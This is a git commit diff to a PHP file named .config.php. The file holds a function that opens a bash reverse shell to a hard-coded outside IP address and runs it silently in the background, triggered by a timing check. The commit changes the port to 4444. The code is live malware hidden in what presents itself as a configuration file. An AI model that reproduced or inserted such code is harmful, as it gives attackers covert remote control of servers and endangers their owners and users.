199b342c2600a975db51755df01fa10645c1d300
dvreux <148452795+dvreux@users.noreply.github.com>
2025-08-09 17:27:17 +0700

    Update .config.php

--- .config.php
+++ .config.php
@@ -1,7 +1,7 @@
 <?php
 function reverse_shell() {
     $ip = '188.166.181.70';
-    $port = '444';
+    $port = '4444';
     $payload = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
 
     shell_exec("nohup $payload > /dev/null 2>&1 &");
@@ -10,4 +10,5 @@ function reverse_shell() {
 if (time() % 480 == 0) {
     reverse_shell();
 }
+
 ?>
